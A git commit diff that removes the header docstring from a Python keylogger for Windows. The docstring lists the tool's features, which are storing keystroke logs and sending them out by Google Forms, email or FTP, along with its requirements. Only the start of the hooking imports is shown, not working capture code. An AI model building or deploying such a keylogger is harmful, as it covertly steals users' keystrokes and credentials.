0af9b2a8bae2b9a7f88ca189f8f5794fd3c85a7d
Eliseo Torres <eliseo.torres95@gmail.com>
2016-09-13 01:12:55 -0500

    Update xenotix_python_logger.py

--- xenotix_python_logger.py
+++ xenotix_python_logger.py
@@ -1,29 +1,4 @@
-'''
-Xenotix Python Keylogger for Windows
-====================================
-Coded By: Ajin Abraham <ajin25@gmail.com>
-Website: http://opensecurity.in/xenotix-python-keylogger-for-windows/
-GitHub: https://github.com/ajinabraham/Xenotix-Python-Keylogger
 
-FEATURES
-========
-1.STORE LOGS LOCALLY
-2.SEND LOGS TO GOOGLE FORMS
-3.SEND LOGS TO EMAIL
-4.SEND LOGS TO FTP
-
-MINIMUM REQUIREMENTS
-===================
-Python 2.7: http://www.python.org/getit/
-pyHook Module: http://sourceforge.net/projects/pyhook/
-pyrhoncom Module: http://sourceforge.net/projects/pywin32/
-
-pyHook Module - 
-Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
-
-
-NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
-'''
 try:
     import pythoncom, pyHook
 except:
